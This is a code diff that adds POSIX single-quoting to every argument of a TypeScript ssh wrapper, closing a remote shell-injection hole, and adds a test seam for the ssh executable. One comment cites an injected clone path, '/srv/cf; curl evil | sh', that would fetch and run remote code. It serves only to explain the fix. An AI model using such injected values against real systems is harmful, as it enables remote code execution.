@@ -110,6 +110,16 @@ export function runCheck(
   });
 }
 
+/**
+ * One word, quoted for a POSIX shell: wrapped in single quotes, with each
+ * embedded `'` written as `'\''` (close the quote, an escaped quote, reopen).
+ * Inside single quotes nothing is special, so the result is exactly one literal
+ * word whatever it holds: spaces, `;`, `$(…)`, backticks, newlines.
+ */
+export function shellQuote(word: string): string {
+  return `'${word.replaceAll("'", "'\\''")}'`;
+}
+
 /** What one command on a remote host found, and what it printed. */
 export interface RemoteResult {
   readonly status: CheckStatus;
@@ -126,19 +136,33 @@ export interface RemoteResult {
  * after it: DNS, and auth, both outlive `ConnectTimeout`, which is why the whole
  * thing is bounded again by `timeoutMs`.
  *
- * The remote argv travels as separate arguments. `ssh` joins them with spaces
- * on the far side, which is what makes `git -C <clone> config user.email` work,
- * and it means nothing here is ever interpreted by a local shell.
+ * No LOCAL shell ever sees the argv (`shell: false`), but the REMOTE one does:
+ * `ssh` joins its trailing arguments with spaces and hands the result to the
+ * remote login shell, which parses it. A `clone` of `/srv/cf; curl evil | sh`
+ * would therefore execute. Every remote word is POSIX single-quoted first, so
+ * the far side receives exactly the words that were given here.
  */
 export function runRemote(
   alias: string,
   argv: readonly string[],
   timeoutMs: number = CHECK_TIMEOUT_MS,
+  options: {
+    /** The ssh executable. A seam for tests, which stand a fake in for it. */
+    readonly sshCommand?: string;
+  } = {},
 ): Promise<RemoteResult> {
   return new Promise((resolve) => {
     const child = spawn(
-      "ssh",
-      ["-n", "-o", "BatchMode=yes", "-o", "ConnectTimeout=5", alias, ...argv],
+      options.sshCommand ?? "ssh",
+      [
+        "-n",
+        "-o",
+        "BatchMode=yes",
+        "-o",
+        "ConnectTimeout=5",
+        alias,
+        ...argv.map(shellQuote),
+      ],
       { ...SPAWN_BASE, stdio: ["ignore", "pipe", "ignore"] },
     );
     let settled = false;
